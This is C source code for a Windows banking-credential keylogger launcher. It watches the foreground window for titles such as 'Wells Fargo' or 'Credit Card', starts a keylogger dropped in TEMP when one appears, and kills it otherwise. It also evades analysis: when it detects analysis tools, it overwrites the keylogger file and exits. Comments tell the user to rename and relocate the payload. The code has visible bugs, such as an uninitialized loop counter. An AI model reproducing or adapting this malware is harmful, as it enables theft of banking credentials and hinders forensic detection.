#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#include <tlhelp32.h>


TCHAR malpath[MAX_PATH];
TCHAR path[MAX_PATH];

int createpath(LPCTSTR exename, LPCTSTR environmentvar) {
	GetEnvironmentVariable(environmentvar, path, MAX_PATH);
	strcat_s(malpath, strlen(malpath)+strlen(path)+1, path);
	strcat_s(malpath, strlen(malpath)+strlen(exename)+1, exename);
}

void bnk(LPCTSTR exename) {
	const CHAR * titles[] = {"Wells Fargo", "Credit Card"};
	TCHAR wtitle[MAX_PATH];
	CHAR * cmd = "taskkill /F /T /IM ";
	strcat_s(cmd, strlen(cmd)+strlen(exename)+1, exename);
	loop:for (int z; z < sizeof(titles)/sizeof(titles[0]); z++) {
		HWND window = GetForegroundWindow();
		GetWindowText(window, wtitle, MAX_PATH);
		int jamfora_3 = strncmp(wtitle, titles[0], strlen(titles[0]));
		if (jamfora_3 != 0) {
			//system("taskkill /F /T /IM svart.exe");
			system(cmd);
			goto loop;
		}
		else {
			PROCESSENTRY32 entry;
			entry.dwSize= sizeof(PROCESSENTRY32);
			int runcheck;
			int proccheck;
			HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
			//wait till while loop is done, set var equal to 1 if process is found running then check its value
			if (Process32First(snapshot, &entry) == TRUE) {
				while (Process32Next(snapshot, &entry) == TRUE) {
					int jamfora = strncmp(entry.szExeFile, "Process", strlen("Process"));
					//if (stricmp(entry.szExeFile, "svart.exe") == 0) {
					if (stricmp(entry.szExeFile, exename) == 0) {
						runcheck = 1;
					}
					else if (jamfora == 0) {
						printf("[!] Analysis tools detected!\n");
						proccheck = 1;
						DWORD bwritten;
						HANDLE cmal = CreateFileA(malpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
						if (cmal != INVALID_HANDLE_VALUE) {
							printf("[-] Opened main malware\n");
						}
						int wmal = WriteFile(cmal, "00000", strlen("00000"), &bwritten, NULL);
						if (wmal != 0) {
							printf("[-] Successfully overwritten malware!\n");
						}						
						exit(0);
					}

				}
				if (runcheck == 1) {
					printf("[!] svart is already running!\n");
				
				}
				else {
					STARTUPINFO si = {0};
					PROCESS_INFORMATION pi = {0};
					int cpresult = CreateProcessA(malpath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
					if (cpresult != 0) {
						printf("[+] Keylogger started!\n");
					}
					else {
						printf("[!] Error with starting keylogger!\n");
					}
				}
				goto loop;
			}
		}
	}

}
int main() {
	//change svart.exe & TEMP to name of keylogger & env var where it was dropped
	createpath("//svart.exe", "TEMP");
	while (TRUE) {	
		bnk("svart.exe");
	}
}
